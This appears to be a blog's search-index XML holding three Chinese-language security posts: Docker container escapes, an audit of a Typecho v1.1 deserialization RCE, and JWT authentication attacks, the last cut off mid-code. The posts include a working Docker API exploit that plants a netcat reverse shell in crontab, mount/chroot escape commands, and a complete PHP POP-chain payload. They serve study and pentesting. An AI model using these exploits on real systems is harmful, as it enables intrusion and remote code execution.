<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>一些Docker逃逸漏洞</title>
      <link href="2021/some-docker-escape-vulnerabilities.html"/>
      <url>2021/some-docker-escape-vulnerabilities.html</url>
      
        <content type="html"><![CDATA[<p>渗透测试中，常会拿到Docker环境的Shell，为了扩展攻击面和进一步拿到有价值数据，不得不需要逃逸到宿主机上。所以查询了目前的Docker逃逸手法，做个复现总结。</p><a id="more"></a><h2 id="判断是否为Docker环境"><a href="#判断是否为Docker环境" class="headerlink" title="判断是否为Docker环境"></a>判断是否为Docker环境</h2><ul><li><p>检查是否存在<code>/.dockerenv</code>文件（可能没有）；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la / | grep .dockerenv</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/20210223160653.png" alt=".dockerenv"></p></li><li><p>检查<code>/proc/1/cgroup</code>文件内是否存在<code>docker</code>字符串；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup | grep docker</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/20210223160913.png" alt="/proc/1/cgroup"></p></li><li><p>检测虚拟化环境（可能没有）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemd-detect-virt -c</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/20210223161235.png" alt="systemd-detect-virt"></p></li></ul><h2 id="Docker逃逸方法"><a href="#Docker逃逸方法" class="headerlink" title="Docker逃逸方法"></a>Docker逃逸方法</h2><h3 id="配置不当引发Docker逃逸"><a href="#配置不当引发Docker逃逸" class="headerlink" title="配置不当引发Docker逃逸"></a>配置不当引发Docker逃逸</h3><h4 id="Docker-Remote-API-未授权"><a href="#Docker-Remote-API-未授权" class="headerlink" title="Docker Remote API 未授权"></a>Docker Remote API 未授权</h4><p>可参考<a href="https://github.com/vulhub/vulhub/tree/master/docker/unauthorized-rce">vulhub</a>的漏洞环境。利用方法是，我们随意启动一个容器，并将宿主机的<code>/etc</code>目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。</p><p>Exploit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=<span class="string">&#x27;http://your-ip:2375/&#x27;</span>)</span><br><span class="line">data = client.containers.run(<span class="string">&#x27;alpine:latest&#x27;</span>, <span class="string">r&#x27;&#x27;&#x27;sh -c &quot;echo &#x27;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;&#x27;&#x27;</span>, remove=<span class="literal">True</span>, volumes=&#123;<span class="string">&#x27;/etc&#x27;</span>: &#123;<span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/tmp/etc&#x27;</span>, <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure><p>Github找到的一个利用工具：<a href="https://github.com/Tycx2ry/docker_api_vul">docker_api_vul</a></p><h4 id="Docker-高危启动参数"><a href="#Docker-高危启动参数" class="headerlink" title="Docker 高危启动参数"></a>Docker 高危启动参数</h4><p>当操作者执行<code>--privileged</code>（特权模式）时，Docker将允许容器访问宿主机上的所有设备，使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p><p>例如docker管理员启动容器时使用了<code>--privileged</code>参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -itd --privileged ubuntu:latest /bin/bash</span><br></pre></td></tr></table></figure><p>在该容器内部查看磁盘信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/20210224103538.png" alt="fdisk -l"></p><p>可以发现宿主机磁盘信息，攻击者可以直接在容器内部挂载<code>/dev/sda1</code>，即可访问宿主机磁盘数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda1 /mnt</span><br><span class="line"><span class="comment"># 挂载/dev/sda1磁盘</span></span><br><span class="line">chroot /mnt</span><br><span class="line"><span class="comment"># 切换根目录至/mnt</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/20210224103846.png" alt="mount-chroot"></p><p>到这里已经成功逃逸了，然后就是常规的写入定时计划反弹shell或者写入ssh密钥实现免密登陆等（与redis未授权相似）。</p><p>除特权模式外Docker通过Namespace实现六项资源隔离，包括主机名、用户权限、文件系统、网络、进程号、进程间通讯。但部分启动参数授予容器权限较大的权限，从而打破了资源隔离的界限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--cap-add=SYS_ADMIN  <span class="comment"># 启动时，允许执行mount特权操作，需获得资源挂载进行利用。</span></span><br><span class="line">--net=host           <span class="comment"># 启动时，绕过Network Namespace</span></span><br><span class="line">--pid=host           <span class="comment"># 启动时，绕过PID Namespace</span></span><br><span class="line">--ipc=host           <span class="comment"># 启动时，绕过IPC Namespace</span></span><br></pre></td></tr></table></figure><h3 id="由Docker程序漏洞逃逸"><a href="#由Docker程序漏洞逃逸" class="headerlink" title="由Docker程序漏洞逃逸"></a>由Docker程序漏洞逃逸</h3><h4 id="CVE-2019-5736-RunC漏洞逃逸"><a href="#CVE-2019-5736-RunC漏洞逃逸" class="headerlink" title="CVE-2019-5736 - RunC漏洞逃逸"></a>CVE-2019-5736 - RunC漏洞逃逸</h4><p><strong>影响版本：</strong></p><p>Docker Version &lt;=18.09.2<br>RunC Version &lt;=1.0-rc6</p><p><strong>Exploit：</strong></p><p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p><p><img src="https://oss.zjun.info/zjun.info/20210224113620.png" alt="CVE-2019-5736-PoC"></p><p>其中payload可设置为反弹shell命令。</p><h4 id="CVE-2019-14271-Docker-cp-命令漏洞逃逸"><a href="#CVE-2019-14271-Docker-cp-命令漏洞逃逸" class="headerlink" title="CVE-2019-14271 - Docker cp 命令漏洞逃逸"></a>CVE-2019-14271 - Docker cp 命令漏洞逃逸</h4><p><strong>影响版本：</strong></p><p>18.09 &lt; Docker Version &lt; 19.03.1</p><p>Docker采用Golang语言编写。存在漏洞的Docker版本采用Go v1.11编译。简单的说漏洞来源是因为<code>docker cp</code>时会调用辅助进程<code>docker-tar</code>。并且在运行时会加载多个<code>libnss_*.so</code>库。</p><p><code>docker-tar</code>的原理是<code>chroot</code>到容器中，归档其中请求的文件及目录，然后将生成的<code>tar</code>文件传回Docker守护进程，该进程负责将文件提取到宿主机上的目标目录中。</p><p>除了chroot到容器文件系统外，docker-tar并没有被容器化。它是在host命名空间运行的，权限为root全新且不受限于cgroups或seccomp。因此，通过注入代码到docker-tar，恶意容器就可以获取host主机的完全root访问权限。</p><p><strong>攻击场景：</strong></p><ul><li>容器运行含有恶意<code>libnss_*.so</code>库的镜像；</li><li>容器中含有被攻击者替换的<code>libnss_*.so</code>库。</li></ul><p>漏洞利用可参考：<a href="https://xz.aliyun.com/t/6806">CVE-2019-14271：Docker copy漏洞分析</a></p><h4 id="CVE-2020-15257-Containerd漏洞逃逸"><a href="#CVE-2020-15257-Containerd漏洞逃逸" class="headerlink" title="CVE-2020-15257 - Containerd漏洞逃逸"></a>CVE-2020-15257 - Containerd漏洞逃逸</h4><p><strong>影响版本：</strong></p><p>Containerd Version &lt;= 1.3.7 / &lt;=1.4.0 / &lt;=1.4.1</p><p>可运行<code>docker version</code>查看其<code>Containerd Version</code>。</p><p><strong>Exploit：</strong></p><p><a href="https://github.com/cdk-team/CDK/">https://github.com/cdk-team/CDK/</a></p><h3 id="由内核漏洞逃逸"><a href="#由内核漏洞逃逸" class="headerlink" title="由内核漏洞逃逸"></a>由内核漏洞逃逸</h3><h4 id="CVE-2016-5195-Dirty-Cow脏牛提权漏洞逃逸"><a href="#CVE-2016-5195-Dirty-Cow脏牛提权漏洞逃逸" class="headerlink" title="CVE-2016-5195 - Dirty Cow脏牛提权漏洞逃逸"></a>CVE-2016-5195 - Dirty Cow脏牛提权漏洞逃逸</h4><p><strong>影响版本：</strong></p><p>Linux kernel &gt;= 2.6.22（2007年发行到2016年10月18日之间发行的Linux内核）</p><p>Dirty Cow（CVE-2016-5195）是Linux内核中的提权漏洞，通过它可实现Docker容器逃逸，获得root权限的shell。Docker与宿主机共享内核，因此容器需要运行在存在Dirty Cow漏洞的宿主机里。</p><p><strong>Exploit：</strong></p><p><a href="https://github.com/scumjr/dirtycow-vdso">https://github.com/scumjr/dirtycow-vdso</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.cnblogs.com/xiaozi/p/13423853.html">https://www.cnblogs.com/xiaozi/p/13423853.html</a></li><li><a href="https://xz.aliyun.com/t/8558">https://xz.aliyun.com/t/8558</a></li><li><a href="https://xz.aliyun.com/t/7881">https://xz.aliyun.com/t/7881</a></li><li><a href="https://xz.aliyun.com/t/6806">https://xz.aliyun.com/t/6806</a></li><li><a href="https://www.freebuf.com/vuls/260512.html">https://www.freebuf.com/vuls/260512.html</a></li><li><a href="https://github.com/vulhub/vulhub/tree/master/docker/unauthorized-rce">https://github.com/vulhub/vulhub/tree/master/docker/unauthorized-rce</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker逃逸 </tag>
            
            <tag> CVE-2016-5195 </tag>
            
            <tag> CVE-2020-15257 </tag>
            
            <tag> CVE-2019-5736 </tag>
            
            <tag> CVE-2019-14271 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>审计 Typecho 反序列化导致任意代码执行</title>
      <link href="2021/audit-typecho-deserialize-to-rce.html"/>
      <url>2021/audit-typecho-deserialize-to-rce.html</url>
      
        <content type="html"><![CDATA[<p>Typecho是一个PHP开发的博客系统，使用得还是挺多的，本文审计的漏洞是基于v1.1版本的，于2017年曝出的反序列化漏洞。在看完其他很多师傅博客对该漏洞的审计，发现很有学习价值，同时调试理解。</p><p>测试程序版本：<a href="https://github.com/typecho/typecho/releases/tag/v1.1-15.5.12-beta">Typecho v1.1(15.5.12)</a></p><a id="more"></a><h2 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h2><p>提前已经大概了解整个pop链，所以贴张<a href="https://www.anquanke.com/post/id/155306">网图</a>如下：</p><p><img src="https://oss.zjun.info/zjun.info/20210219144052.png" alt="pop链"></p><p>下面按照这个流程进行分析。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>Typecho v1.1</code>版本安装完成之后，不会自动删除<code>install.php</code>文件，而这也是漏洞发生的点。</p><p>漏洞入口是<code>install.php</code>，先进行了两个前置判断。可以看见调试信息，只要传入GET参数finish，并且还需要Http头部的Referer为站内URL即可，主要在59行与74行体现。</p><p><img src="https://oss.zjun.info/zjun.info/20210218223316.png" alt="install.php"></p><p>随后就是产生反序列化漏洞的点，于229行到235行</p><p><img src="https://oss.zjun.info/zjun.info/20210218230143.png" alt="install.php"></p><p>230行将<code>__typecho_config</code>的值通过base64解码之后反序列化，<code>__typecho_config</code>是<code>/var/Typecho/Cookie.php</code>中传过来的，可通过<code>Cookie</code>或<code>Post</code>方法传入，此处可控。</p><p><img src="https://oss.zjun.info/zjun.info/20210218232305.png" alt="/var/Typecho/Cookie.php"></p><p>回到<code>install.php</code>，看到232行，将<code>$config[&#39;adapter&#39;]</code>传入<code>Typecho_Db()</code>中，<code>$config</code>就是在230行反序列化传来的对象，因此该参数也是可控的，跟进<code>Typecho_Db()</code></p><p><img src="https://oss.zjun.info/zjun.info/20210219133227.png" alt="/var/Typecho/Db.php"></p><p>在<code>/var/Typecho/Db.php</code>文件中，分析其构造方法，114行传入的<code>$adapterName</code>，在120行做字符串拼接，<code>$adapterName</code>其实就是<code>install.php</code>文件中232行传入的<code>$config[&#39;adapter&#39;]</code>，是可控参数，如果该参数是对象的话，那么就会调用其<code>__toString()</code>方法。</p><blockquote><p>__construct：构造函数会在每次创建新对象时先调用</p><p>__toString：当对象被当做字符串的时候会自动调用该函数</p></blockquote><p>寻找可用的<code>__toString()</code>方法，跟进<code>/var/Typecho/Feed.php</code>文件，于223行开始</p><p><img src="https://oss.zjun.info/zjun.info/20210219135052.png" alt="/var/Typecho/Feed.php"></p><p>再往下分析，290行调用了<code>$item[&#39;author&#39;]-&gt;screenName</code>，是当前类的一个私有变量。如果<code>$item[&#39;author&#39;]</code>是一个不存在<code>screenName</code>属性的类的话，就会调用<code>__get</code>魔术方法，而此处的<code>item</code>同样可控</p><blockquote><p>__get：当调用一个未定义的属性时访问此方法</p></blockquote><p><img src="https://oss.zjun.info/zjun.info/20210219140758.png" alt="/var/Typecho/Feed.php"></p><p>找到<code>/var/Typecho/Request.php</code> 第269行可利用的<code>__get</code>方法</p><p><img src="https://oss.zjun.info/zjun.info/20210219141137.png" alt="/var/Typecho/Request.php"></p><p>分析该get函数，检测<code>$key</code>是否在<code>$this-&gt;_params[$key]</code>这个数组里面，如果有的话将值赋值给<code>$value</code>，紧着又对其他数组变量检测<code>$key</code>是否在里面，如果在数组里面没有检测<code>$key</code>，则将<code>$value</code>赋值成<code>$default</code>，最后判断一下<code>$value</code>类型，将<code>$value</code>传入到<code>_applyFilter()</code>函数里面。<code>$this-&gt;_params[$key]</code>是可控的，而<code>$key</code>正是<code>screenName</code>，因此<code>$value</code>可控</p><p><img src="https://oss.zjun.info/zjun.info/20210219141254.png" alt="/var/Typecho/Request.php"></p><p>跟进<code>_applyFiter()</code>函数</p><p><img src="https://oss.zjun.info/zjun.info/20210219142313.png" alt="/var/Typecho/Request.php"></p><p>163行发现危险函数<code>array_map()</code>和<code>call_user_func()</code>，且<code>$filter</code>和<code>$value</code>都可控。程序首先遍历类中<code>$_filter</code>变量，如果<code>$value</code>是数组则将调用<code>array_map()</code>，反之则将调用<code>call_user_func()</code>。</p><p>直接这样构造的Poc传入会返回500，原因是在<code>install.php</code>的开头还有一个点，第54行调用了<code>ob_start()</code></p><p><img src="https://oss.zjun.info/zjun.info/20210219144606.png" alt="install.php"></p><blockquote><p>ob_start：打开输出控制缓存</p></blockquote><p>程序对反序列化之后的内容进行处理时抛出异常位于<code>/var/Typecho/Db.php</code>第123行</p><p><img src="https://oss.zjun.info/zjun.info/20210219151005.png" alt="/var/Typecho/Db.php"></p><p>并在<code>/var/Typecho/Common.php</code>中第237行调用了<code>ob_end_clean()</code>清空了缓冲区</p><p><img src="https://oss.zjun.info/zjun.info/20210219145854.png" alt="/var/Typecho/Common.php"></p><p>并在最后在354行输出到模板中，然后<code>exit</code>退出了程序。具体传参执行过程可通过调试看出。解决方法可以提前<code>exit</code>程序，让程序不运行到抛出异常处。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_type</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_items</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="string">&quot;RSS 2.0&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;title&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">                <span class="string">&quot;link&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">                <span class="string">&quot;data&quot;</span> =&gt; <span class="string">&quot;20190430&quot;</span>,</span><br><span class="line">                <span class="string">&quot;author&quot;</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">            ),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;screenName&quot;</span> =&gt; <span class="string">&quot;eval(&#x27;phpinfo();exit;&#x27;)&quot;</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>(<span class="string">&quot;assert&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;adapter&quot;</span> =&gt; <span class="variable">$a</span>,</span><br><span class="line">    <span class="string">&quot;prefix&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$c</span>));</span><br></pre></td></tr></table></figure><p>执行得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo0OntzOjU6InRpdGxlIjtzOjQ6InRlc3QiO3M6NDoibGluayI7czo0OiJ0ZXN0IjtzOjQ6ImRhdGEiO3M6ODoiMjAxOTA0MzAiO3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjIzOiJldmFsKCdwaHBpbmZvKCk7ZXhpdDsnKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NDoidGVzdCI7fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/20210219150702.png" alt="phpinfo()"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://www.anquanke.com/post/id/155306">https://www.anquanke.com/post/id/155306</a></p></li><li><p><a href="https://www.cnblogs.com/litlife/p/10798061.html">https://www.cnblogs.com/litlife/p/10798061.html</a></p></li><li><p><a href="https://paper.seebug.org/424/">https://paper.seebug.org/424/</a></p></li><li><p><a href="https://github.com/typecho/typecho/commit/e277141c974cd740702c5ce73f7e9f382c18d84e">https://github.com/typecho/typecho/commit/e277141c974cd740702c5ce73f7e9f382c18d84e</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> 反序列化漏洞 </tag>
            
            <tag> PHP </tag>
            
            <tag> Typecho </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT鉴权攻击</title>
      <link href="2021/attacking-jwt-authentication.html"/>
      <url>2021/attacking-jwt-authentication.html</url>
      
        <content type="html"><![CDATA[<p>Json Web Token简称JWT，是一种基于json格式传输信息的token鉴权方式。目前应用较为广泛，Web登陆认证以及CTF中也时常遇到。由于它的无状态和签名方式，因此存在一些特定于JWT的安全性问题。这篇文章介绍几种JWT鉴权攻击方法。</p><a id="more"></a><h2 id="JWT数据结构"><a href="#JWT数据结构" class="headerlink" title="JWT数据结构"></a>JWT数据结构</h2><p>JWT由三部分组成，这些部分中间以<code>.</code>号分隔，分别是：</p><ul><li>Header（头部）</li><li>Payload（有效载荷）</li><li>Signature（签名）</li></ul><p>因此JWT通常格式为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64UrlEncode(Header). base64UrlEncode(Payload).Signature</span><br></pre></td></tr></table></figure><p>其中Header与Payload以明文经Base64Url编码存储。</p><p>一段在 <a href="https://jwt.io/">https://jwt.io/</a> 生成的JWT如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6InpqdW4iLCJpYXQiOjE1MTYyMzkwMjJ9.nND9JmdF_kAXhJuJkGo8ss_Fx34zpY8xGt6FcB6qFIc</span><br></pre></td></tr></table></figure><p>下面让我们将其分解加以解析。</p><h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>Header通常由两部分组成：令牌的类型<code>typ</code>（即JWT）和所使用的签名算法<code>alg</code>（例如HS256、RS256）。</p><p>上面一段JWT的第一部分是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><br></pre></td></tr></table></figure><p>经Base64Url解码如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>Payload用来承载要传递的数据，它的json结构实际上是对JWT要传递的数据的一组声明，这些声明被JWT标准称为claims，它的一个”属性值对“就是一个claim，每一个claim都代表特定的含义和作用。</p><p>claims有三种类型分别是：Registered claims、Public claims、Private claims。</p><p>详细可见：<a href="https://jwt.io/introduction/">https://jwt.io/introduction/</a></p><p>上面一段JWT的第二部分是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6InpqdW4iLCJpYXQiOjE1MTYyMzkwMjJ9</span><br></pre></td></tr></table></figure><p>经Base64Url解码如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;sub&quot;</span>: <span class="string">&quot;1234567890&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;zjun&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;iat&quot;</span>: <span class="number">1516239022</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>要创建签名部分，必须获取编码的header，编码的payload，加密密钥（secret），header中指定的算法，并对其进行签名。</p><p>例如，如果要使用<code>HS256</code>算法，则将通过以下方式创建签名：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>签名用于验证数据在发送过程中没有被篡改。</p><p>上面一段JWT的signature部分是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nND9JmdF_kAXhJuJkGo8ss_Fx34zpY8xGt6FcB6qFIc</span><br></pre></td></tr></table></figure><h2 id="JWT攻击实现"><a href="#JWT攻击实现" class="headerlink" title="JWT攻击实现"></a>JWT攻击实现</h2><h3 id="敏感信息泄漏"><a href="#敏感信息泄漏" class="headerlink" title="敏感信息泄漏"></a>敏感信息泄漏</h3><p>通过JWT数据结构的分析，显然可知：header与payload是以明文经Base64Url编码传输的，因此，如果payload中存在敏感信息的话，就会发生信息泄露。</p><h3 id="更改签名算法"><a href="#更改签名算法" class="headerlink" title="更改签名算法"></a>更改签名算法</h3><p>JWT签名算法用以防止用户篡改其中的数据。例如使用HMAC或RSA签名。JWT的header包含用于对JWT进行签名的算法，某些算法的一个缺点是，即使客户端可以操纵它，它们也信任此JWT标头。如果存在此漏洞，则客户端可以创建自己的令牌。</p><h4 id="将alg设置为None"><a href="#将alg设置为None" class="headerlink" title="将alg设置为None"></a>将alg设置为None</h4><p>签名算法可以确保JWT在传输过程中不会被恶意用户所篡改。但header头部中的<code>alg</code>字段却可以改为<code>none</code>。另外，一些JWT库也支持<code>none</code>算法，即不使用签名算法。将<code>alg</code>设置为<code>none</code>，告诉服务器不进行签名校验。</p><p>将alg字段改为none后，系统就会从JWT中删除相应的签名数据。这时，JWT就是<code> base64UrlEncode(header). base64UrlEncode(payload).</code>，然后将其提交给服务器。</p><p>一个演示项目实例：<a href="https://github.com/Sjord/jwtdemo">https://github.com/Sjord/jwtdemo</a></p><p>HS256演示页面：<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a></p><p>Exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># header</span></span><br><span class="line"><span class="comment"># eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span></span><br><span class="line"><span class="comment"># &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span></span><br><span class="line"><span class="comment"># payload eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxMzM1OTI1OSwiZXhwIjoxNjEzMzYwNDU5LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0</span></span><br><span class="line"><span class="comment"># &#123;&quot;iss&quot;: &quot;http://demo.sjoerdlangkemper.nl/&quot;,&quot;iat&quot;: 1613359259,&quot;exp&quot;: 1613360459,&quot;data&quot;: &#123;&quot;hello&quot;: &quot;world&quot;&#125;&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b64urlencode</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data).replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>).replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>).replace(<span class="string">&#x27;=&#x27;</span>, <span 